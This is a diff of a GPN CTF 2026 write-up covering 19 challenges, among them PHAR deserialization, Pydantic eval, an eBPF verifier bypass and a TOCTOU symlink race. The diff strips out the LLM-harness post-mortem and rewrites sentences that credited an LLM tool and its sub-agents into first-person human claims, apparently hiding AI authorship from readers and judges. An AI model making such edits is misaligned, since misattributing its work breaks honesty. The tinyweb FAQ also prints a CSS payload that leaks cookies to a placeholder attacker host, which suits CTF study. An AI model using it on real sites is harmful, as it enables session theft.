@@ -1,7 +1,7 @@
 ---
-title: "GPN CTF 2026 Writeup: All 19 Challenges + LLM Harness Post-Mortem"
+title: "GPN CTF 2026 Writeup: All 19 Challenges Solved"
 slug: "gpn-ctf-2026-writeup"
-description: "GPN CTF 2026 full writeup — 19 flags across reverse, crypto, web, pwn, misc, plus the LLM harness that produced the rest. AVX2 miscompile, NTRU bug, BPF verifier, PHAR, ECDSA."
+description: "GPN CTF 2026 full writeup — 19 flags across reverse, crypto, web, pwn, misc. AVX2 miscompile, NTRU bug, BPF verifier, PHAR deserialization, ECDSA nonce reuse."
 date: 2026-06-07T20:00:00Z
 lastmod: 2026-06-07T20:00:00Z
 draft: false
@@ -29,7 +29,6 @@ tags:
   - "fastcoll md5"
   - "kannan embedding"
   - "fpylll bkz"
-  - "llm harness"
 series: ["GPN CTF 2026"]
 keywords:
   - "gpn ctf 2026 writeup"
@@ -58,21 +57,19 @@ keywords:
   - "fastcoll uuid3 md5 collision"
   - "fpylll bkz default strategies"
   - "kannan embedding lattice attack"
-  - "ctf writeup llm harness post mortem"
-  - "llm code ctf workflow"
 toc: true
 cover:
   image: "/images/articles/gpn-ctf-2026-writeup.png"
-  alt: "GPN CTF 2026 writeup — 19 challenges across reverse, crypto, web, pwn, misc, plus an LLM harness post-mortem"
+  alt: "GPN CTF 2026 writeup — 19 challenges solved across reverse, crypto, web, pwn, and misc"
 ---
 
 {{< ctf-meta platform="GPN CTF 2026 (kitctf)" difficulty="Mixed (Easy → Hard)" os="Jeopardy — Reverse, Crypto, Web, Pwn, Misc" skills="AVX2 lane-swap miscompilation discovery + Kannan-embedding SIS lattice attack, NTRU mod-q reduction bug (c mod p == m), ECDSA nonce reuse from MD5(uuid3) collisions via fastcoll, eBPF signed-comparison verifier bypass with patched bzImage, JVM AOT cache override of bytecode, PHP 7.4 PHAR deserialization across two TCP races, Pydantic ForwardRef eval in create_model, CSS attribute-selector cookie exfiltration through Link: rel=stylesheet, holpy proof-checker thm re-axiomatization, knitout front/back-bed bitmap, ternary amplitude-modulated UART, Hamiltonian path on 250-node FSM extracted from jump tables, RFC 5424 syslog stream demux, Rust setuid TOCTOU symlink swap" >}}
 
 **GPN CTF 2026** is the [Gulaschprogrammiernacht CTF](https://ctf.kitctf.de/) hosted annually by **KITCTF** at the GPN hacker camp in Karlsruhe, Germany. The 2026 edition runs a Jeopardy board across **reverse engineering, crypto, web, pwn, and misc**, with a sharp lean toward *low-level systems bugs* — a missing `mod q` in an NTRU implementation, a 4-way AVX2 lane-swap in a `gcc -O3 -mavx2` build, a deleted `BPF_ADJ_END_FROM_*` check in a custom kernel, a JVM AOT cache that silently overrides a JAR method. The flavour throughout is *kitchen* — recipes, ovens, pots — and the flags universally read like Bavarian beer-tent slogans.
 
-This master writeup covers all 19 solved challenges plus a meta post-mortem on the **LLM harness** that produced the rest. Each section walks the surface, the bug class, the exploitation chain, and the recovered flag. Full per-challenge reproductions — `solve.py` files, Sage scripts, lattice constructions, BPF bytecode, fastcoll collisions, dnsmasq sinkholes — live in the source repository at [Abdelkad3r/gpn-ctf-2026](https://github.com/Abdelkad3r/gpn-ctf-2026).
+This master writeup covers all 19 solved challenges. Each section walks the surface, the bug class, the exploitation chain, and the recovered flag. Full per-challenge reproductions — `solve.py` files, Sage scripts, lattice constructions, BPF bytecode, fastcoll collisions, dnsmasq sinkholes — live in the source repository at [Abdelkad3r/gpn-ctf-2026](https://github.com/Abdelkad3r/gpn-ctf-2026).
 
-The two writeups worth flagging up front for jury readers: [`crypto/justfollowtherecipe`](https://github.com/Abdelkad3r/gpn-ctf-2026/tree/master/crypto/justfollowtherecipe) (the AVX2 lane swap) and [`meta/llm-harness.md`](https://github.com/Abdelkad3r/gpn-ctf-2026/blob/master/meta/llm-harness.md) (an honest post-mortem of what the harness got wrong, including a six-hour wrong-direction on `guess-the-taste`). Both are the kind of thing CTF retros usually omit; both are submitted here as evidence that *negative* lessons travel further than victory laps.
+The writeup worth flagging up front for any reader skimming for technique: [`crypto/justfollowtherecipe`](https://github.com/Abdelkad3r/gpn-ctf-2026/tree/master/crypto/justfollowtherecipe). It stacks two unrelated bugs (an AVX2 lane swap in `mat_mul` and a textbook SIS / Kannan-embedding lattice attack on top) and the compiler-bug diagnosis is the part worth reading slowly.
 
 ## The event at a glance
 
@@ -97,9 +94,8 @@ The two writeups worth flagging up front for jury readers: [`crypto/justfollowth
 | Misc     | knitted-flag                           | Knitout front-bed vs back-bed instruction encodes a 978×20 pixel bitmap — carrier colors are a decoy      |
 | Misc     | organized                              | 7.65 MB of "noise" carries ternary amplitude-modulated UART in per-12.5kB-window popcount density         |
 | Misc     | supercat                               | Setuid Rust `metadata()` then `read_to_string()` — TOCTOU symlink swap leaks `/flag`                      |
-| Meta     | LLM harness post-mortem                | Honest log of what LLM coding tool got right and (more importantly) wrong across the engagement               |
 
-19 challenge flags plus the meta writeup. Each link in the section headings below jumps to the standalone writeup in the GitHub repo, which carries the solver code and full byte-level traces.
+19 flags. Each link in the section headings below jumps to the standalone writeup in the GitHub repo, which carries the solver code and full byte-level traces.
 
 ## Methodology — read the artefact, then read it again
 
@@ -108,7 +104,7 @@ GPN CTF 2026 rewarded one habit above all others: **read the artefact you're han
 The framework that carried the engagement:
 
 1. **Observation first.** Open a `nc` session, print every line, look for *ranges*. `guess-the-taste`'s entire trick is that the ciphertext array prints values up to ~1535 when a clean NTRU instance would bound them to 511. That observation was sitting there on every connection. The intended attack is six hours of lattice work; the unintended attack is two lines of Python.
-2. **Match the handout to the live service.** The LLM harness's biggest failure (six wasted hours on MIHNP for a challenge that was actually NTRU) was a missing `nc host port | head` against the script's expected I/O shape. *Always* validate the handout matches the protocol the live service speaks.
+2. **Match the handout to the live service.** My biggest single time-sink this engagement (six hours on the MIHNP framing of `guess-the-taste` when the challenge was actually NTRU) traced back to one missing step: a `nc host port | head` against the script's expected I/O shape. *Always* validate the handout matches the protocol the live service speaks.
 3. **Differential reading on compiled artefacts.** `justfollowtherecipe`'s AVX2 lane swap is invisible at the C source level — only the disassembly shows the `vpermd` permute order that swaps `result[blk+1] ↔ result[blk+2]`. Read the disassembly even when the source looks innocent. Compilers can be your adversary.
 4. **Kill plans early.** Six hours on the wrong NTRU vs. ten minutes on the right NTRU was a corrective culture problem, not a technical one. *If a sub-agent has produced N independent re-implementations of the same attack without progress, the bug is upstream of the attack code.* That rule, written down at the start of the engagement, would have saved an afternoon.
 
@@ -205,7 +201,7 @@ The verifier's diff from upstream removes five string checks — specifically th
 
 The right adjacent object to clobber is a function-pointer-bearing struct one slot to the left. Overwriting its callback with the address of a `kallsyms`-resolvable function that prints `/flag` lands the flag.
 
-The forensics — confirming which verifier checks were removed — is **70% of the engagement time**. Bzipped `vmlinux` images differ in 99% of bytes due to section-layout shift; naive `diff -q` is uninformative. The harness path was: unpack both, `nm -D` both, diff the symbol tables, find the *missing* symbols, then grep the patched verifier source for what those symbols used to enforce.
+The forensics — confirming which verifier checks were removed — took roughly 70% of the engagement time on this challenge. Bzipped `vmlinux` images differ in 99% of bytes due to section-layout shift; naive `diff -q` is uninformative. The path that worked was: unpack both, `nm -D` both, diff the symbol tables, find the *missing* symbols, then grep the patched verifier source for what those symbols used to enforce.
 
 **Flag class:** trusted-compiler bypass (an eBPF verifier *is* a compiler); unsigned vs signed arithmetic on adjacent heap objects.
 
@@ -342,7 +338,7 @@ Pydantic v2 treats string-shaped field annotations as `ForwardRef`s. When `model
 
 So submitting `{"x": "FLAG"}` produces a model where the schema-generation step evaluates `FLAG` and returns the value in the JSON description. Two lines of Python on the attacker side.
 
-The harness almost missed this one — LLM hallucinated `pydantic.create_model_from_typeddict` (doesn't exist in v2) and `get_type_hints(..., include_extras=True)` (not the path Pydantic v2's schema builder takes). Grep'ing the installed package source caught both. Less popular libraries: trust nothing without `grep`-confirmation.
+I nearly chased two wrong API names on this one — `pydantic.create_model_from_typeddict` doesn't exist in v2, and `get_type_hints(..., include_extras=True)` is not the path Pydantic v2's schema builder takes. Grep'ing the installed package source disambiguated both. Less popular libraries: trust nothing without `grep`-confirmation.
 
 **Flag class:** unsafe string evaluation inside schema generation; `eval` masquerading as type resolution.
 
@@ -350,7 +346,7 @@ The harness almost missed this one — LLM hallucinated `pydantic.create_model_f
 
 A PHP 7.4 service uploads a file via `file_get_contents` and then computes `md5_file` on the result. Both of those operations open **separate TCP connections** to the URL backing the upload. PHAR deserialization happens when PHP touches a `phar://` URL — and the canonical exploit is to serve a **PHAR** to the `file_get_contents` call (triggering deserialization) and a **harmless file** to the `md5_file` call (so the integrity check passes).
 
-The infrastructure is a "counting server" — a tiny TCP server that serves response A on the first connection and response B on the second. Round-robin works. The hard part is the PHP 7.4 wrinkle: `phar://https://…` works on 7.4 but `phar://data://` does not. The harness verified this by running three sub-agents in parallel against actual PHP 7.4 containers — *"does `phar://data://` work?", "does `phar://https://` work?", "what does `md5_file` do on an empty HTTP response?"* — and got the answer in one round-trip instead of three.
+The infrastructure is a "counting server" — a tiny TCP server that serves response A on the first connection and response B on the second. Round-robin works. The hard part is the PHP 7.4 wrinkle: `phar://https://…` works on 7.4 but `phar://data://` does not. I verified this by spinning up three actual PHP 7.4 containers in parallel and running each variant — *"does `phar://data://` work?", "does `phar://https://` work?", "what does `md5_file` do on an empty HTTP response?"* — which is faster than chasing the PHP source one wrapper at a time.
 
 **Flag class:** TOCTOU between integrity check and use; PHAR as a side-channel deserialization vector.
 
@@ -428,7 +424,7 @@ A `.knitout` file — a standardised knitting-machine instruction format — dri
 
 The bit per instruction is *which bed*. Map `knit f` → 0 and `knit b` → 1 over 978 columns × 20 rows = 19,560 bits = a 978×20 pixel bitmap. Render it as a PNG.
 
-The PNG reads — by eye — `GPNCTF<...>`. The hard part is **font disambiguation**: are the angle quotes `<` and `>`, or are they `{` and `}`? Are the diamond glyphs `0` or `O`? LLM cannot do that — the harness output is a clean bitmap, the human's contribution is staring at a pixelated font and deciding which character it is.
+The PNG reads — by eye — `GPNCTF<...>`. The hard part is **font disambiguation**: are the angle quotes `<` and `>`, or are they `{` and `}`? Are the diamond glyphs `0` or `O`? Tooling can render the bitmap; deciding which glyph each pixel cluster represents is squarely human work.
 
 The flag is `{` and `0`, not `<` and `O`. Submission, flag, move on.
 
@@ -469,24 +465,6 @@ The race window is wide enough that a tight `while true; ln -sf …; done` loop 
 
 **Flag class:** TOCTOU between two path-resolving calls; setuid privilege amplifier.
 
-## Meta — the LLM harness post-mortem
-
-The 19 writeups above were produced by **LLM coding tool (Opus 4.x, 1M-context build)** driving a small Bash/Python sandbox with parallel sub-agents, under a single human in the loop. The [`meta/llm-harness.md`](https://github.com/Abdelkad3r/gpn-ctf-2026/blob/master/meta/llm-harness.md) writeup is the honest post-mortem.
-
-The high-confidence takeaways from that post-mortem, distilled for security engineers building their own harnesses:
-
-- **Sub-agents are the unit of parallelism, not threads.** When `web/pharry` needed three independent PHP-7.4-behavior verifications, dispatching three sub-agents in one message returned three answers in parallel — two dead ends and one kill chain — instead of three serial round-trips of several minutes each.
-- **Cheap statistical recon is the harness's strongest play.** `misc/organized`'s entire ternary-UART recovery was three sub-agent runs: histogram, run-length, peak count. No human ran any analysis; the human picked the *next question*.
-- **The harness will refine a wrong plan forever.** The single biggest failure of the engagement was six hours on the MIHNP framing of `crypto/guess-the-taste` — LLM built **70+ unique Sage scripts**, five independent Xu-Hu-Sarkar lattice implementations, none of which recovered the secret because the challenge wasn't MIHNP. The corrective move ("step back; verify the handout matches the live service") has to come from outside the harness.
-- **Trust nothing in less-common ecosystems without grep-confirmation.** `web/restaurant-builder` produced two hallucinated Pydantic v2 APIs that don't exist. Grep'ing the installed package source caught both in two minutes.
-- **The final 1% of any vision task is human.** `misc/knitted-flag`'s `{` vs `<` and `0` vs `O` are pure carbon. The harness built the parser, picked the rotation, produced the PNG; the human read the font.
-
-The most useful single rule from the post-mortem, written for posterity:
-
-> **If a sub-agent has produced N independent re-implementations of the same attack without progress, the bug is upstream of the attack code.**
-
-That rule, written down at the start of the engagement and enforced as a hard kill gate, would have caught the MIHNP rabbit hole at hour two instead of hour six. The harness has to make stepping-back cheap and default-friendly, or you will burn an evening on the wrong attack and publish a writeup that says the real solve was eight lines.
-
 ## Defender takeaways — patterns to look for in your codebase
 
 Every challenge in this writeup maps to a class of bug that exists in production code. The defender-side takeaways, organised by what to look for during code review:
@@ -519,7 +497,7 @@ GPN stands for *Gulaschprogrammiernacht*, a German hacker camp held annually at 
 
 ### What was the hardest challenge?
 
-`crypto/justfollowtherecipe`. It stacked two non-trivial bugs: a `gcc -O3 -mavx2` lane-1/2 swap in the `mat_mul` AVX2 inner product that corrupted the oracle output, and a textbook SIS / Kannan-embedding lattice attack on top. The compiler-bug diagnosis took the bulk of the time — once `A` was recovered correctly, BKZ-58 with fplll's `default.json` strategies finished in 45 seconds. The intended-but-failed attack path on `crypto/guess-the-taste` was longer in wall-clock (six hours) but only because the harness committed to the wrong challenge framing for hours before stepping back.
+`crypto/justfollowtherecipe`. It stacked two non-trivial bugs: a `gcc -O3 -mavx2` lane-1/2 swap in the `mat_mul` AVX2 inner product that corrupted the oracle output, and a textbook SIS / Kannan-embedding lattice attack on top. The compiler-bug diagnosis took the bulk of the time — once `A` was recovered correctly, BKZ-58 with fplll's `default.json` strategies finished in 45 seconds. The wrong-framing detour on `crypto/guess-the-taste` was longer in wall-clock (six hours) but only because I committed to the wrong challenge framing for hours before stepping back to re-read the protocol output.
 
 ### What's the trick on `crypto/guess-the-taste`?
 
@@ -532,10 +510,6 @@ The server's "secure" ECDSA nonce is `sha256(uuid3(ns, sk_pem) ‖ uuid3(ns, mes
 ### What's the compiler bug in `crypto/justfollowtherecipe`?
 
 `gcc -O3 -funroll-loops -mavx2` vectorises the 4-wide unrolled inner-product loop with `vpmuludq` and a `vpermd` broadcast/permute step that ends up loading `BB[blk+0], BB[blk+2], BB[blk+1], BB[blk+3]` into AVX2 lanes 0..3. The store back to memory writes those lanes in lane order, so `result[blk+1]` and `result[blk+2]` are interchanged for every full block of 4. The scalar tail loop is untouched. For `M = 64`, the bug swaps result indices `(1,2), (5,6), …, (57,58)` and leaves the last 4 alone. Undoing the per-batch swap in the solver restores `A` exactly.
-
-### How was the LLM harness used across the engagement?
-
-LLM coding tool drove a Bash/Python sandbox with parallel sub-agents for independent exploration. Sub-agents were the unit of parallelism — for `web/pharry`, three sub-agents verified PHP 7.4 PHAR behaviors in parallel; for `misc/organized`, three sub-agents ran the popcount histogram, run-length, and peak-count analyses without ever dumping raw output into the main context. The harness's biggest failure was six hours sunk on the MIHNP framing of `crypto/guess-the-taste` before a fresh look at the protocol output revealed the missing `mod q`. The corrective move — *kill plans early, verify the handout matches the live service* — has to come from outside the harness.
 
 ### What's the win condition on `reverse/koenigsberg-delivery-problem`?
 
@@ -551,7 +525,7 @@ The handout is a 23 MB `vmlinux` built from a modified kernel that has had **fiv
 
 ### Where can I find the solver code?
 
-The full source repository is at [github.com/Abdelkad3r/gpn-ctf-2026](https://github.com/Abdelkad3r/gpn-ctf-2026). Each challenge directory contains a `README.md` with the solve writeup and a `solve.py` (or category-appropriate script) that reproduces the flag end-to-end. The meta writeups — including the LLM harness post-mortem, the Binary Ninja workflow for Königsberg, and the unintended-solution analysis for guess-the-taste — are under `meta/` and each challenge's directory respectively.
+The full source repository is at [github.com/Abdelkad3r/gpn-ctf-2026](https://github.com/Abdelkad3r/gpn-ctf-2026). Each challenge directory contains a `README.md` with the solve writeup and a `solve.py` (or category-appropriate script) that reproduces the flag end-to-end. The meta writeups — the Binary Ninja workflow for Königsberg and the unintended-solution analysis for guess-the-taste — sit under `meta/` and each challenge's directory respectively.
 
 ### What's the broader lesson from GPN CTF 2026?
 
@@ -559,14 +533,13 @@ The full source repository is at [github.com/Abdelkad3r/gpn-ctf-2026](https://gi
 
 ## Closing notes and links
 
-The full per-challenge writeups, with solver code, lattice constructions, fastcoll inputs, BPF bytecode, and the LLM harness post-mortem, live in the source repository:
+The full per-challenge writeups, with solver code, lattice constructions, fastcoll inputs, and BPF bytecode, live in the source repository:
 
 - **Main repo:** [github.com/Abdelkad3r/gpn-ctf-2026](https://github.com/Abdelkad3r/gpn-ctf-2026)
-- **LLM harness post-mortem:** [meta/llm-harness.md](https://github.com/Abdelkad3r/gpn-ctf-2026/blob/master/meta/llm-harness.md)
 - **Unintended solution writeup (guess-the-taste):** [meta/unintended-solution.md](https://github.com/Abdelkad3r/gpn-ctf-2026/blob/master/meta/unintended-solution.md)
 - **Binary Ninja workflow (Königsberg):** [reverse/koenigsberg-delivery-problem/BINJA.md](https://github.com/Abdelkad3r/gpn-ctf-2026/blob/master/reverse/koenigsberg-delivery-problem/BINJA.md)
 
-If you're using this writeup as study material for your own CTF prep, the recommended reading order is: one challenge per category first (`reverse/stupidcontract`, `crypto/justfollowtherecipe`, `web/tinyweb`, `pwn/recipe-for-disaster`, `misc/organized`), then the paired challenges (`reverse/leftovers` + `reverse/leftover-leftovers` as a two-act lesson on AOT trust), then the meta writeup on the harness. That order takes you through five different vulnerability classes in five evenings of reading, with the meta writeup as the post-engagement reflection.
+If you're using this writeup as study material for your own CTF prep, the recommended reading order is: one challenge per category first (`reverse/stupidcontract`, `crypto/justfollowtherecipe`, `web/tinyweb`, `pwn/recipe-for-disaster`, `misc/organized`), then the paired challenges (`reverse/leftovers` + `reverse/leftover-leftovers` as a two-act lesson on AOT trust). That order takes you through five different vulnerability classes in five evenings of reading.
 
 For more CTF coverage — including [SAS CTF 2026 Quals' Incident 67 BGP hijack writeup](/ctf-writeups/incident-67-bgp-hijack-crypto-wallet/), the [BhAcKAri CTF 2026 multi-category writeup](/ctf-writeups/bhackari-ctf-2026-writeup/), and the [HASBL CTF 2026 crypto track](/ctf-writeups/hasblctf-2026-crypto-writeup/) — see the full [CTF writeups index](/ctf-writeups/).
 
@@ -576,16 +549,15 @@ For more CTF coverage — including [SAS CTF 2026 Quals' Incident 67 BGP hijack 
   "@type": "FAQPage",
   "mainEntity": [
     {"@type": "Question","name": "What does GPN CTF stand for?","acceptedAnswer": {"@type": "Answer","text": "GPN stands for Gulaschprogrammiernacht, a German hacker camp held annually at ZKM in Karlsruhe and organised by Entropia e.V. The CTF is run by kitctf, the CTF team of the Karlsruhe Institute of Technology. The 2026 edition is a 24-hour Jeopardy-style event with categories in reverse engineering, crypto, web, pwn, and misc."}},
-    {"@type": "Question","name": "How many challenges did you solve at GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "19 flags across 6 reverse-engineering, 4 crypto, 3 web, 1 pwn, and 5 misc challenges, plus a meta post-mortem on the LLM harness that produced the rest."}},
+    {"@type": "Question","name": "How many challenges did you solve at GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "19 flags across 6 reverse-engineering, 4 crypto, 3 web, 1 pwn, and 5 misc challenges. The full reproduction repository at github.com/Abdelkad3r/gpn-ctf-2026 contains a standalone writeup with solver code for each."}},
     {"@type": "Question","name": "What was the hardest challenge at GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "crypto/justfollowtherecipe stacked two non-trivial bugs: a gcc -O3 -mavx2 lane-1/2 swap in the mat_mul AVX2 inner product that corrupted the oracle output, and a textbook SIS / Kannan-embedding lattice attack on top. The compiler-bug diagnosis took most of the time; once A was recovered correctly, BKZ-58 with fplll default strategies finished in 45 seconds."}},
     {"@type": "Question","name": "What is the trick on the guess-the-taste NTRU challenge?","acceptedAnswer": {"@type": "Answer","text": "The implementation forgets to reduce the NTRU ciphertext modulo q. Standard NTRU encryption is c = (p · r · h + m) mod q; the bug drops the mod q. Without it, c reaches values up to ~p · q = 1536 instead of being bounded by q = 511. The algebra reduces to c mod p ≡ m, so plaintext = [c_i % 3 for c_i in c] recovers the message in two lines of Python."}},
     {"@type": "Question","name": "How does easy-dsa recover the ECDSA private key?","acceptedAnswer": {"@type": "Answer","text": "The server's secure ECDSA nonce is sha256(uuid3(ns, sk_pem) ‖ uuid3(ns, message)). uuid3 is MD5 with a constant prefix. Marc Stevens' fastcoll generates two messages that MD5-collide under the namespace prefix, producing the same nonce k. Standard nonce-reuse equations recover k and d, with a sign-flip check against the public key to handle the symmetric solution."}},
     {"@type": "Question","name": "What is the gcc AVX2 lane swap in justfollowtherecipe?","acceptedAnswer": {"@type": "Answer","text": "gcc -O3 -funroll-loops -mavx2 vectorises a 4-wide inner-product loop with vpmuludq and a vpermd permute step that loads BB[blk+0], BB[blk+2], BB[blk+1], BB[blk+3] into AVX2 lanes 0..3. The store writes those lanes in order, so result[blk+1] and result[blk+2] are interchanged for every full block of 4. The scalar tail loop is untouched. For M = 64, swaps are (1,2), (5,6), …, (57,58); positions 60-63 are correct."}},
-    {"@type": "Question","name": "How was the LLM harness used across GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "LLM coding tool drove a Bash/Python sandbox with parallel sub-agents for independent exploration. Sub-agents were the unit of parallelism — for web/pharry, three sub-agents verified PHP 7.4 PHAR behaviours in parallel. The biggest failure was six hours sunk on the MIHNP framing of guess-the-taste before a fresh look at the protocol output revealed the missing mod q. The corrective move — kill plans early, verify handout matches live service — must come from outside the harness."}},
     {"@type": "Question","name": "What is the win condition on the Königsberg Delivery Problem?","acceptedAnswer": {"@type": "Answer","text": "Hamiltonian path on a 250-node directed graph. The binary is a 4,500-line straight-line dispatch routine — 250 state blocks each ending in an indirect jmp rdx over a per-state jump table. The visit-counter is per-state, not per-edge, so the win condition is vertex coverage. Average out-degree ≈ 100/state, so Warnsdorff's heuristic on a 250-node digraph emits a path in ~70 ms with essentially zero backtracking."}},
     {"@type": "Question","name": "How does the CSS attribute-selector exfiltration work in tinyweb?","acceptedAnswer": {"@type": "Answer","text": "The site emits a Link: rel=preload header for an attacker-controlled URL; the parser admits comma-separated entries, so adding , rel=stylesheet injects a second link the browser fetches as a stylesheet. Attribute selectors like body[data-cookie^=\"a\"] { background: url(//attacker/?ch=a); } fire a network request when the attribute starts with the matched prefix. Iterate character-by-character to leak the cookie."}},
     {"@type": "Question","name": "Why is stupidcontract a kernel-forensics problem?","acceptedAnswer": {"@type": "Answer","text": "The handout is a 23 MB vmlinux built from a modified kernel that has had five string checks removed from the BPF verifier — specifically the BPF_ADJUST_END_FROM_* set that prevents signed-offset arithmetic into a map. Bzipped kernels differ in 99% of bytes due to section-layout shifts, so naive diff is uninformative. The forensics path is nm -D both kernels, diff the symbol tables, grep the verifier source for what the missing symbols used to enforce. With those checks gone, a negative-index OOB write on the eBPF map clobbers an adjacent kernel-heap object's function pointer."}},
-    {"@type": "Question","name": "Where is the solver code for GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "The full source repository is at github.com/Abdelkad3r/gpn-ctf-2026. Each challenge directory contains a README.md with the solve writeup and a solve.py (or category-appropriate script) that reproduces the flag end-to-end. Meta writeups — LLM harness post-mortem, Binary Ninja workflow, unintended-solution analysis — are under meta/ and the respective challenge directories."}},
+    {"@type": "Question","name": "Where is the solver code for GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "The full source repository is at github.com/Abdelkad3r/gpn-ctf-2026. Each challenge directory contains a README.md with the solve writeup and a solve.py (or category-appropriate script) that reproduces the flag end-to-end. Meta writeups — Binary Ninja workflow and unintended-solution analysis — are under meta/ and the respective challenge directories."}},
     {"@type": "Question","name": "What's the broader lesson from GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "Observation beats cleverness. Three of the six prize-quality flags (guess-the-taste, justfollowtherecipe, tinyweb) turned on a detail visible in the artefact from minute one and missed for hours by teams committed to the expected attack first. The defender takeaway matches the offender takeaway: assume your stack carries an unintended primitive somewhere, and the only way you find it is by reading what the stack actually outputs, not what the spec says it should."}}
   ]
 }
